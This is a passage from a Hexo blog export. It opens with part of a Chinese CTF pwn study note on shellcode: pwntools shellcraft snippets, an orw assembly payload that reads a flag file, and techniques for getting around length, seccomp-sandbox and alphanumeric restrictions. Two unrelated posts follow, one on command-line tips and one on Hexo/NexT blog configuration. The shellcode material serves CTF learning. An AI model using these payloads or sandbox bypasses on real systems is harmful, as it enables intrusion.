<h4 id="shellcraft">[1-2-1-1] shellcraft</h4>
<ul>
<li><p><a
href="https://docs.pwntools.com/en/stable/shellcraft.html">Manual</a></p></li>
<li><p>速成 (更多请 RTFM 或查看 [1-3] ) <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># arch: i386 / amd64</span></span><br><span class="line"><span class="comment"># os: linux</span></span><br><span class="line"><span class="comment"># func: open / read / write / mmap</span></span><br><span class="line">shellcode = shellcraft.arch.os.func(args)</span><br></pre></td></tr></table></figure></p></li>
</ul>
<h4 id="asm">[1-2-1-2] asm</h4>
<ul>
<li>定义: <code>def asm(str) -&gt; bytes</code></li>
</ul>
<h2 id="板子">[1-3] 板子</h2>
<ol type="1">
<li><p>常用 shellcraft</p>
<p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># open(&#x27;./flag&#x27;)</span></span><br><span class="line">shellcode_open = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># read(fd,addr,nbytes)</span></span><br><span class="line">shellcode_read = shellcraft.read(<span class="number">0</span>,<span class="number">0xBABECAFE</span>,<span class="number">0x80</span>)</span><br><span class="line"><span class="comment"># 其他用法: shellcraft.read(&#x27;eax&#x27;,&#x27;esp&#x27;,0x100)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># write(fd,addr,nbytes)</span></span><br><span class="line">shellcode_read = shellcraft.write(<span class="number">1</span>,<span class="number">0xBABECAFE</span>,<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># mmap(addr,len,prot,flags,fd,offset)</span></span><br><span class="line">shellcode_mmap = shellcraft.mmap(<span class="number">0xBABECAFE</span>,<span class="number">0x80</span>,<span class="number">7</span>,<span class="number">34</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure></p></li>
<li><p>不用堆栈的 <code>orw</code>，字符串"flag"需要提前布置好.
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">shellcode1 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rdi,0x2333008     # 指向&quot;flag\x00\x00\x00\x00&quot;的指针</span></span><br><span class="line"><span class="string">xor esi,esi</span></span><br><span class="line"><span class="string">mov rax,2</span></span><br><span class="line"><span class="string">syscall               # open(&#x27;./flag&#x27;)</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">mov rdi,3             # fd = 3</span></span><br><span class="line"><span class="string">mov rdx,0x50          # nbytes = 0x50</span></span><br><span class="line"><span class="string">mov esi,0x2333100     # address = 0x2333100</span></span><br><span class="line"><span class="string">mov rax,0</span></span><br><span class="line"><span class="string">syscall               # read(3,0x2333100,0x50)</span></span><br><span class="line"><span class="string">mov rdi,1             # stdin = 1</span></span><br><span class="line"><span class="string">mov rdx,0x50          # nbytes = 0x50</span></span><br><span class="line"><span class="string">mov esi,0x2333100     # address = 0x2333100</span></span><br><span class="line"><span class="string">mov rax,1</span></span><br><span class="line"><span class="string">syscall               # write(1,0x2333100,0x50)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></p></li>
</ol>
<h2 id="在线网站">[1-4] 在线网站</h2>
<ol type="1">
<li><p><a href="defuse.ca">Online x86 and x64 Intel Instruction
Assembler</a>: 在线编写 shellcode 和反汇编 shellcode，目前只支持
x86/x64</p></li>
<li><p><a href="shell-storm.org">Online Assembler and Disassembler</a>:
另一个更全的在线编写 shellcode 和反汇编 shellcode 网站</p></li>
<li><p><a href="shell-storm.org">Shellcodes database for study
cases</a>: shellcode 数据库，支持很多指令集与操作系统</p></li>
<li><p><a href="exploit-db.com">Exploit Database Shellcodes</a>: 另一个
shellcode 数据库</p></li>
<li><p><a href="revshells.com">Online - Reverse Shell Generator</a>:
生成反弹 shell 的命令</p></li>
</ol>
<h2 id="手搓-shellcode">[1-5] 手搓 shellcode</h2>
<p>传参顺序: rdi,rsi,rdx,rcx,r8,r9</p>
<p>存<a
href="https://blog.csdn.net/qq_29343201/article/details/52209588">系统调用号</a>的寄存器:
rax</p>
<h2 id="c-代码提取-shellcode">[1-6] C 代码提取 shellcode</h2>
<p><a href="https://www.jianshu.com/p/5d1b1eafca21">看这篇</a></p>
<h1 id="shellcode-restrictions-bypass-限制与绕过">[2] shellcode
restrictions &amp; bypass (限制与绕过)</h1>
<h2 id="length-restrictions-长度约束">[2-1] Length restrictions
(长度约束)</h2>
<h3 id="restriction">[2-1-1] restriction</h3>
<p>shellcode 限制在 xx bytes 以内</p>
<h3 id="bypass1---压缩-shellcode">[2-1-2] bypass1 - 压缩 shellcode</h3>
<ol type="1">
<li><p>可以去 <a
href="https://shell-storm.org/shellcode/index.html">Shellcodes database
for study cases(已停止更新)</a> 找比较小的 shellcode</p></li>
<li><p>常用压缩方式</p>
<ol type="1">
<li><p>⚠ 观察 <code>寄存器 + 栈</code> 的状态</p></li>
<li><p>长寄存器改为短寄存器 <code>rax(8bytes)</code> -&gt;
<code>eax(4bytes)</code> -&gt; <code>ax(2bytes)</code> -&gt;
<code>ah/al(1byte)</code></p></li>
<li><p>置零</p>
<ol type="1">
<li><p><code>mov reg, 0</code> -&gt; <code>xor reg, reg</code></p></li>
<li><p>多用 <code>push / pop</code></p></li>
<li><p>多用 <code>cdq</code> 来将 <code>rdx</code> 置零</p></li>
<li><p>多用 <code>xchg</code> 交换 <code>reg1</code> 和
<code>reg2</code></p>
<ul>
<li>观察执行 shellcode 时的
context（上下文），用上下文的一些寄存器来初始化</li>
</ul></li>
</ol></li>
</ol></li>
<li><p>没什么用的积累 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov edx,7   ---&gt;   cdq; mov dl,7</span><br></pre></td></tr></table></figure></p></li>
</ol>
<h3 id="bypass2---二次-read">[2-1-3] bypass2 - 二次 read</h3>
<h2 id="seccomp-禁用">[2-2] seccomp 禁用</h2>
<h3 id="restriction-1">[2-2-1] restriction</h3>
<p>程序调用 <code>seccomp</code> 或 <code>prctl</code>
禁用了某些系统调用</p>
<blockquote>
<p>本质是沙盒逃逸，后续打算这里只留下常用的汇编语句或者shellcraft语法，原理挪到
<a href="">Pwn - Sandbox Escape Summary</a> 中去</p>
</blockquote>
<h3 id="bypass">[2-2-2] bypass</h3>
<blockquote>
<p>本质是对 IO stream
的汇编考察，学习这一部分应当积累足够多的相关知识。</p>
</blockquote>
<p><a
href="https://blog.csdn.net/qq_54218833/article/details/134205383">顶级
seccomp 文章</a></p>
<h4 id="open">open</h4>
<h4 id="read">read</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GPT 有关 read 的拓展</span><br><span class="line"></span><br><span class="line">如果 `read`、`pread64` 和 `readv` 等系统调用被禁用了，你可能可以考虑使用其他的系统调用来读取文件。以下是一些可能的替代方案：</span><br><span class="line"></span><br><span class="line">1. **mmap**: 使用 `mmap` 系统调用映射文件到内存中，然后通过内存访问来读取文件内容。</span><br><span class="line"></span><br><span class="line">2. **open + read**: 可以使用 `open` 系统调用打开文件，然后使用 `read` 或者 `pread64` 等系统调用来读取文件内容。</span><br><span class="line"></span><br><span class="line">3. **fopen + fread**: 使用标准 C 库函数 `fopen` 和 `fread` 来打开和读取文件内容。</span><br><span class="line"></span><br><span class="line">4. **openat + read**: 使用 `openat` 系统调用打开文件，然后使用 `read` 或者 `pread64` 等系统调用来读取文件内容。</span><br><span class="line"></span><br><span class="line">5. **pipe + fork + exec**: 创建一个管道，在子进程中执行命令来读取文件内容，父进程通过管道读取子进程的输出。</span><br><span class="line"></span><br><span class="line">6. **recv + recvfrom**: 如果你可以通过网络传输文件，你可以使用 `recv` 或 `recvfrom` 等网络套接字函数来接收文件数据。</span><br><span class="line"></span><br><span class="line">7. **其他文件操作函数**: 还有一些其他的文件操作函数，比如 `lseek` 可以用于移动文件指针，`preadv` 可以用于原子地读取多个文件描述符指定的文件内容等。</span><br><span class="line"></span><br><span class="line">要选择合适的替代方案，需要考虑到具体的情况和环境限制。</span><br></pre></td></tr></table></figure>
<h4 id="write">write</h4>
<h4 id="废弃待整理">废弃，待整理</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用 `seccomp-tools dump ./pwn` 来查看 elf 文件被禁用了哪些调用</span><br><span class="line"></span><br><span class="line">#### [2-2-2-1] 禁用 `execve`</span><br><span class="line"></span><br><span class="line">- bypass: orw</span><br><span class="line"></span><br><span class="line">#### [2-2-2-2] OR 没有 W ( prctl 禁用 `open` 但不禁用 `fstat`)</span><br><span class="line"></span><br><span class="line">&gt; 注：由于下面的绕过方式需要在64位与32位之间切换，所以建议不要在 exp 开头设置 `context(arch=&#x27;i386/amd64&#x27;)` ，而是选择 `asm(shellcode,arch=&#x27;i386/amd64&#x27;)`</span><br><span class="line"></span><br><span class="line">- bypass: 由于64位下 `fstat` 函数的调用号为 5，而在32位中 `open` 的系统调用号为 5，所以我们可以利用 `retfq` 切换到 32 位执行 `open`</span><br></pre></td></tr></table></figure>
<h2 id="alphanumeric-shellcode-字母数字构成">[2-3] alphanumeric
shellcode (字母+数字构成)</h2>
<h3 id="manual-1">[2-3-1] Manual</h3>
<p><a href="https://nets.ec/Ascii_shellcode">ascii -&gt; asm
手册</a></p>
<h3 id="restriction-2">[2-3-2] restriction</h3>
<p>shellcode 只能由字母和数字组成</p>
<h3 id="shellcode-生成">[2-3-3] shellcode 生成:</h3>
<p>这种 shellcode 可以由工具 <a
href="https://github.com/SkyLined/alpha3">ALPHA3</a> 直接生成，</p>
<p>但 alpha3 的 build 有点儿麻烦，不如直接用杭电一位师傅写的 <a
href="https://github.com/veritas501/ae64">AE64</a>，</p>
<p>AE64 可以将任何 <code>AMD64</code> 架构的 shellcode 转换为
alphanumeric shellcode</p>
<h3 id="示例">[2-3-4] 示例：</h3>
<blockquote>
<p>AE64 在 github 的 README 有更详细的介绍</p>
</blockquote>
<p>简单示例 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get bytes format shellcode</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line"><span class="comment"># get alphanumeric shellcode</span></span><br><span class="line">enc_shellcode = AE64().encode(shellcode)</span><br><span class="line"><span class="built_in">print</span>(enc_shellcode.decode(<span class="string">&#x27;latin-1&#x27;</span>))</span><br></pre></td></tr></table></figure></p>
<p>进阶选项 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line">enc_shellcode = AE64().encode(shellcode)</span><br><span class="line"><span class="comment"># equal to </span></span><br><span class="line">enc_shellcode = AE64().encode(shellcode, <span class="string">&#x27;rax&#x27;</span>, <span class="number">0</span>, <span class="string">&#x27;fast&#x27;</span>)</span><br><span class="line"><span class="comment"># And we can use &#x27;small&#x27; strategy to generate smaller alphanumeric shellcode</span></span><br><span class="line">enc_shellcode = AE64().encode(shellcode, <span class="string">&#x27;rax&#x27;</span>, <span class="number">0</span>, <span class="string">&#x27;small&#x27;</span>)</span><br></pre></td></tr></table></figure></p>
<h1 id="例题">[3] 例题</h1>
<ol type="1">
<li><p><a href="">hgame2024 Week1 ezshellcode</a></p></li>
<li><p><a href="">hgame2024 week2 ShellcodeMaster</a></p></li>
</ol>
<h1 id="参考资料">[4] 参考资料</h1>
<p><a href="https://mp.weixin.qq.com/s/onpGzz2uzSYKf09yvgb3uA">⭐ The
art of shellcode</a></p>
<p><a
href="https://www.freebuf.com/articles/system/237300.html">简单获取shellcode的几种方式</a></p>
<p><a
href="https://pullp.github.io/tips/2021/01/30/shellcode-tips.html">wxk1997's
blog - shellcode tips</a></p>
<p><a
href="https://hkhanbing.github.io/2023/09/25/brics-ctf-pwn-paint%E9%A2%98%E8%A7%A3/">hkbin's
blog - shellcode</a></p>
<p><a href="https://www.anquanke.com/post/id/219077">关于 seccomp
绕过的更深方法</a></p>
<p><a
href="https://blog.csdn.net/qq_54218833/article/details/134205383">顶级
seccomp 文章</a></p>
<p><a href="https://www.nssctf.cn/note/set/1876">Bsahfuck:
限制只允许几种字符的shellcode</a></p>
<p><a
href="https://xz.aliyun.com/t/6645?time__1311=n4%2BxnD0DRDBGitN47KDsA3xCqbulD9iiABoD&amp;alichlgref=https%3A%2F%2Fwww.bing.com%2F">shellcode
的艺术 - by n0va</a></p>
]]></content>
      <categories>
        <category>CTF_Theory</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
        <tag>Shellcode</tag>
      </tags>
  </entry>
  <entry>
    <title>Tech - The Art of Command Line</title>
    <url>/2024/02/19/Tech%20-%20The%20art%20of%20Command%20Line/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
The Art of Command Line
</blockquote>
<span id="more"></span>
<ol type="1">
<li><p>用 vim + xxd 实现 十六进制文件文本替换 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 注：执行此命令会将原文件覆盖，请提前做好备份！</span></span><br><span class="line">sudo apt install xxd</span><br><span class="line"></span><br><span class="line">vim file</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在vim中输入</span></span><br><span class="line">:%!xxd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 效果</span></span><br><span class="line">00000000: 7f45 4c46 0201 0100 0000 0000 0000 0000  .ELF............</span><br><span class="line">00000010: 0300 3e00 0100 0000 2011 0000 0000 0000  ..&gt;..... .......</span><br><span class="line">00000020: 4000 0000 0000 0000 303b 0000 0000 0000  @.......0;......</span><br><span class="line">00000030: 0000 0000 4000 3800 0d00 4000 1f00 1e00  ....@.8...@.....</span><br><span class="line">00000040: 0600 0000 0400 0000 4000 0000 0000 0000  ........@.......</span><br><span class="line">00000050: 4000 0000 0000 0000 4000 0000 0000 0000  @.......@.......</span><br><span class="line">00000060: d802 0000 0000 0000 d802 0000 0000 0000  ................</span><br><span class="line">00000070: 0800 0000 0000 0000 0300 0000 0400 0000  ................</span><br><span class="line">00000080: 1803 0000 0000 0000 1803 0000 0000 0000  ................</span><br><span class="line">00000090: 1803 0000 0000 0000 1c00 0000 0000 0000  ................</span><br><span class="line">000000a0: 1c00 0000 0000 0000 0100 0000 0000 0000  ................</span><br><span class="line">000000b0: 0100 0000 0400 0000 0000 0000 0000 0000  ................</span><br><span class="line">000000c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................</span><br><span class="line">000000d0: 5808 0000 0000 0000 5808 0000 0000 0000  X.......X.......</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p></li>
<li><p>wc: word count 统计输出 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">a.out | <span class="built_in">wc</span> -l</span><br></pre></td></tr></table></figure></p></li>
</ol>
]]></content>
      <categories>
        <category>CS Basics</category>
      </categories>
      <tags>
        <tag>Tech</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo &amp; Next 博客配置与美化</title>
    <url>/2023/01/10/blog%20configuration%20&amp;%20beautify/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
鉴于我自己的创作欲，准备正式地经营我的博客XD
</blockquote>
<span id="more"></span>
<h1 id="xf-categories">0xF categories</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">categories: &#123;</span><br><span class="line">  - Geek tech: 安全弱相关技术</span><br><span class="line">  - Software analysis technology: 软件分析技术</span><br><span class="line">  - CTF_practice：CTF 比赛wp及日常题目</span><br><span class="line">  - CTF_Theory: CTF 中的理论知识</span><br><span class="line">  - IOT: 物联网相关技术</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="x0-说在前面">0x0 说在前面:</h1>
<blockquote>
<p>环境：Win11 参考资料：CodeSheep师傅在b站上的视频 &amp;
Next官方文档</p>
</blockquote>
<blockquote>
<p>在配置的过程中经常忘记自己配了什么，导致这篇博客可能不是很全，后续换电脑重配环境时再补充XD</p>
</blockquote>
<h1 id="x1-hexo初始化一个博客">0x1 Hexo初始化一个博客</h1>
<p>首先，我们需要在<a
href="https://nodejs.org/en/">Node.js官网</a>中下载nodejs</p>
<p>其次，在终端输入<code>npm install -g cnpm --registry=https://registry.npm.taobao.org</code>
&gt;👆这一步其实可有可无，只不过换到淘宝镜像源以后cnpm的安装速度更快一些</p>
<p>输入<code>cnpm -install -g hexo-cli</code>安装hexo框架，这样hexo就安装好啦XD</p>
<hr />
<p>建立一个空文件夹，并在命令行按序输入<code>hexo init</code>,这样本地的博客就搭建好啦XD</p>
<p>打开自己的Github，创建一个新仓库，名字为<code>个人名称.github.io</code></p>
<p>在终端输入<code>cnpm install --save hexo-deployer-git</code>安装部署器</p>
<p>打开<strong><em>站点配置文件</em></strong>，修改Deployment下的配置
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Deployment</span><br><span class="line">## Docs: https://hexo.io/docs/one-command-deployment</span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo:https://github.com/GithubName/GithubName.github.io.git</span><br><span class="line">  branch: main</span><br></pre></td></tr></table></figure></p>
<p>继续在空文件夹打开终端，输入<code>hexo g</code>和<code>hexo d</code>博客就能部署到远端啦XD</p>
<blockquote>
<p>这里我之前是配置过账户和密码的，所以没有弹出配置的问题，当时也是稀里糊涂就弄好了，导致现在不太清楚到底发生了什么，就没办法复盘，等后面换新电脑再说吧XD</p>
</blockquote>
<h1 id="x2-hexo-config-theme-config">0x2 Hexo config &amp; Theme
config</h1>
<p>我使用的这一个主题👇，这里具体讲讲博客的配置 <a
href="http://theme-next.iissnan.com/">NexT 使用文档 (iissnan.com)</a>
为了描述方便，在以下说明中： 将<strong><em>hexo
init生成的config文件</em></strong>称为<code>站点配置文件</code>
将<strong><em>theme的config文件</em></strong>称为<code>主题配置文件</code></p>
<hr />
<ul>
<li>配置主题 在hexo站点目录中用终端输入👇 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/iissnan/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure>
打开<strong><em>站点配置文件</em></strong>，修改: <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">theme: next</span><br></pre></td></tr></table></figure></li>
<li>个人偏好-<strong><em>主题配置文件</em></strong> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Schemes</span><br><span class="line">scheme: Muse</span><br><span class="line"># scheme: Mist</span><br><span class="line"># scheme: Pisces</span><br><span class="line"># scheme: Gemini</span><br></pre></td></tr></table></figure></li>
<li>站点图像-<strong><em>主题配置文件</em></strong>
修改之前记得在themes\next，图像尺寸要符合16x16和32x32 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">favicon:</span><br><span class="line">  small: /images/favicon-16x16.png</span><br><span class="line">  medium: /images/favicon-32x32.png</span><br><span class="line">  apple_touch_icon: /images/apple-touch-icon-next.png</span><br><span class="line">  safari_pinned_tab: /images/logo.svg</span><br><span class="line">  #android_manifest: /images/manifest.json</span><br><span class="line">  #ms_browserconfig: /images/browserconfig.xml</span><br></pre></td></tr></table></figure></li>
</ul>
<hr />
<ul>
<li>社交链接-<strong><em>主题配置文件</em></strong> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Social Links</span><br><span class="line"># Usage: `Key: permalink || icon`</span><br><span class="line"># Key is the link label showing to end users.</span><br><span class="line"># Value before `||` delimiter is the target permalink, value after `||` delimiter is the name of Font Awesome icon.</span><br><span class="line">social:</span><br><span class="line">  GitHub: https://github.com/HeyGap || fab fa-github</span><br></pre></td></tr></table></figure></li>
</ul>
<hr />
<ul>
<li>搜索:先在站点目录下安装<code>npm install hexo-generator-searchdb --save</code></li>
</ul>
<p><strong><em>站点配置文件</em></strong> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">local_search:</span><br><span class="line">  enable: true</span><br></pre></td></tr></table></figure>
<strong><em>主题配置文件</em></strong>：添加 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  field: post</span><br><span class="line">  format: html</span><br><span class="line">  limit: 10000</span><br></pre></td></tr></table></figure></p>
<hr />
<ul>
<li>引用示例 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;blockquote class=&quot;blockquote-center&quot;&gt;</span><br><span class="line">靡不有初 鲜克有终</span><br><span class="line">&lt;p&gt;&lt;p&gt;</span><br><span class="line">&lt;br&gt;《诗经》</span><br><span class="line">&lt;/blockquote&gt;</span><br></pre></td></tr></table></figure>
<blockquote class="blockquote-center">
靡不有初 鲜克有终
<p>
<p>
<br>《诗经》
</blockquote></li>
</ul>
<hr />
<ul>
<li>更大更有吸引力的图片来源于<code>&lt;img src="/image-url" class="full-image" /&gt;</code></li>
</ul>
<hr />
<ul>
<li>Bootstrap Callout使用方式</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% note class_name %&#125; Content (md partial supported) &#123;% endnote %&#125;</span><br></pre></td></tr></table></figure>
<p>其中，<code>class_name</code> 可以是以下列表中的一个值：</p>
<div class="note default">
            <p>default</p>
          </div>
<div class="note primary">
            <p>primary</p>
          </div>
<div class="note success">
            <p>success</p>
          </div>
<div class="note info">
            <p>info</p>
          </div>
<div class="note warning">
            <p>warning</p>
          </div>
<div class="note danger">
            <p>danger</p>
          </div>
<hr />
<h1 id="x3-latex配置">0x3 LaTex配置</h1>
<blockquote>
<p>我这边pandoc总是出错，于是转用了kramed</p>
</blockquote>
<p>终端输入 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cnpm uninstall hexo-renderer-marked --save</span><br><span class="line">cnpm install hexo-renderer-kramed --save</span><br></pre></td></tr></table></figure></p>
<p><strong><em>主题配置文件</em></strong></p>
<blockquote>
<p>为了加快渲染速度，per_page我选的true，如果嫌麻烦可以直接false</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">math:</span><br><span class="line">  # Default (true) will load mathjax / katex script on demand.</span><br><span class="line">  # That is it only render those page which has `mathjax: true` in Front-matter.</span><br><span class="line">  # If you set it to false, it will load mathjax / katex srcipt EVERY PAGE.</span><br><span class="line">  per_page: true</span><br><span class="line">  </span><br><span class="line">  # hexo-renderer-pandoc (or hexo-renderer-kramed) required for full MathJax support.</span><br><span class="line">  mathjax:</span><br><span class="line">    enable: true</span><br><span class="line">    # See: https://mhchem.github.io/MathJax-mhchem/</span><br><span class="line">    mhchem: false</span><br></pre></td></tr></table></figure>
<p>记得在需要渲染的md加入 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mathjax: true</span><br></pre></td></tr></table></figure></p>
<p>Test the <span class="math inline">\(X_{n-1}\)</span></p>
<blockquote>
<p>不过渲染后就导致写md时多了几个规矩</p>
<ol type="1">
<li>---的上下必须各空一格</li>
</ol>
</blockquote>
<p><a
href="https://www.luogu.com.cn/blog/over-knee-socks/latex-gong-shi-tai-quan-fixed">【公式】KaTeX
使用指南（洛谷特供） - 白色过膝袜 - 洛谷博客 (luogu.com.cn)</a></p>
<h1 id="x4-hexo-x-next-美化">0x4 Hexo x Next 美化</h1>
<ul>
<li>动态背景 在<strong><em>站点目录</em></strong>打开git，输入
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/theme-next/theme-next-canvas-nest themes/next/source/lib/canvas-nest</span><br></pre></td></tr></table></figure> 在<strong><em>主题配置文件</em></strong>中加入
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">canvas_nest: # 网络背景</span><br><span class="line">  enable: true</span><br><span class="line">  onmobile: true # display on mobile or not</span><br><span class="line">  color: &#x27;0,0,0&#x27; # RGB values, use &#x27;,&#x27; to separate</span><br><span class="line">  opacity: 0.5 # the opacity of line: 0~1</span><br><span class="line">  zIndex: -1 # z-index property of the background</span><br><span class="line">  count: 150 # the number of lines</span><br></pre></td></tr></table></figure></li>
</ul>
<blockquote>
<p>记得把其他的动态背景关闭呀，比如</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">three:</span><br><span class="line">  enable: false</span><br><span class="line">  three_waves: false</span><br><span class="line">  canvas_lines: true</span><br><span class="line">  canvas_sphere: false</span><br><span class="line">canvas_ribbon:</span><br><span class="line">  enable: false</span><br></pre></td></tr></table></figure>
<hr />
<ul>
<li>文章结尾
在路径 <code>\themes\next\layout\_macro</code> 中新建 <code>passage-end-tag.swig</code> 文件,并添加以下内容：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">    &#123;% if not is_index %&#125;</span><br><span class="line">        &lt;div style=&quot;text-align:center;color: #ccc;font-size:14px;&quot;&gt;-------------文章就到这里啦！&lt;i class=&quot;fa fa-paw&quot;&gt;&lt;/i&gt;感谢您的阅读XD-------------&lt;/div&gt;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
接着打开<code>\themes\next\layout\_macro\post.swig</code>文件，在<code>post-body</code> 之后(<code>END POST BODY</code>)， <code>post-footer</code> 之前添加以下代码:
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div&gt; </span><br><span class="line">	&#123;% if not is_index %&#125; </span><br><span class="line">		&#123;% include &#x27;passage-end-tag.swig&#x27; %&#125; </span><br><span class="line">	&#123;% endif %&#125; </span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
然后打开<strong><em>主题配置文件</em></strong>，在末尾添加：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">passage_end_tag: </span><br><span class="line">  enabled: true</span><br></pre></td></tr></table></figure></li>
</ul>
<hr />
<ul>
<li>贴一个<a href="https://fontawesome.dashgame.com/">图标库Font
Awesome)</a>，<strong><em>主题配置文件</em></strong>里的在线图标基本都要用到它</li>
</ul>
<hr />
<ul>
<li>代码块复制 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">highlight_theme: night</span><br><span class="line">codeblock:</span><br><span class="line">  border_radius:</span><br><span class="line">  copy_button:</span><br><span class="line">    enable: true</span><br><span class="line">    show_result: true</span><br><span class="line">    # Available values: default | flat | mac</span><br><span class="line">    style: mac</span><br></pre></td></tr></table></figure></li>
</ul>
<hr />
<ul>
<li>回到顶部与阅读进度 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">back2top:</span><br><span class="line">  enable: true</span><br><span class="line">  # Back to top in sidebar.</span><br><span class="line">  sidebar: false</span><br><span class="line">  # Scroll percent label in b2t button.</span><br><span class="line">  scrollpercent: true</span><br><span class="line">  </span><br><span class="line"># Reading progress bar</span><br><span class="line">reading_progress:</span><br><span class="line">  enable: true</span><br><span class="line">  # Available values: top | bottom</span><br><span class="line">  position: top</span><br><span class="line">  color: &quot;#7B68EE&quot;</span><br><span class="line">  height: 3px</span><br></pre></td></tr></table></figure> 附一些参考资料XD~</li>
</ul>
<p><a
href="https://baike.baidu.com/item/%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E9%A2%9C%E8%89%B2%E7%A0%81#:~:text=%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E9%A2%9C%E8%89%B2%E7%A0%81%E5%B0%B1%E6%98%AF%E5%9C%A8%E8%BD%AF%E4%BB%B6%E4%B8%AD%E8%AE%BE%E5%AE%9A%E9%A2%9C%E8%89%B2%E5%80%BC%E7%9A%84%E4%BB%A3%E7%A0%81%E3%80%82%E5%9C%A8%E5%BE%88%E5%A4%9A%E8%BD%AF%E4%BB%B6%E4%B8%AD%EF%BC%8C%E9%83%BD%E4%BC%9A%E9%81%87%E5%88%B0%E8%AE%BE%E5%AE%9A%E9%A2%9C%E8%89%B2%E5%80%BC%E7%9A%84%E9%97%AE%E9%A2%98%EF%BC%8C%E5%8F%91%E5%B1%95%E6%9D%A5%E6%BA%90%20%E4%BA%BA%E7%9A%84%E7%9C%BC%E7%9D%9B%E7%9C%8B%E5%88%B0%E7%9A%84%E9%A2%9C%E8%89%B2%E6%9C%89%E4%B8%A4%E7%A7%8D%EF%BC%9A,%E4%B8%80%E7%A7%8D%E6%98%AF%E5%8F%91%E5%85%89%E4%BD%93%E5%8F%91%E5%87%BA%E7%9A%84%E9%A2%9C%E8%89%B2%EF%BC%8C%E6%AF%94%E5%A6%82%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%98%BE%E7%A4%BA%E5%99%A8%E5%B1%8F%E5%B9%95%E6%98%BE%E7%A4%BA%E7%9A%84%E9%A2%9C%E8%89%B2%EF%BC%9B%20%E5%8F%A6%E4%B8%80%E7%A7%8D%E6%98%AF%E7%89%A9%E4%BD%93%E6%9C%AC%E8%BA%AB%E4%B8%8D%E5%8F%91%E5%85%89%EF%BC%8C%E8%80%8C%E6%98%AF%E5%8F%8D%E5%B0%84%E7%9A%84%E5%85%89%E4%BA%A7%E7%94%9F%20%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E9%A2%9C%E8%89%B2%E3%80%82">十六进制颜色码_百度百科
(baidu.com)</a></p>
<hr />
<ul>
<li>增加阅读次数/时长和访客数-<strong><em>主题配置文件</em></strong>
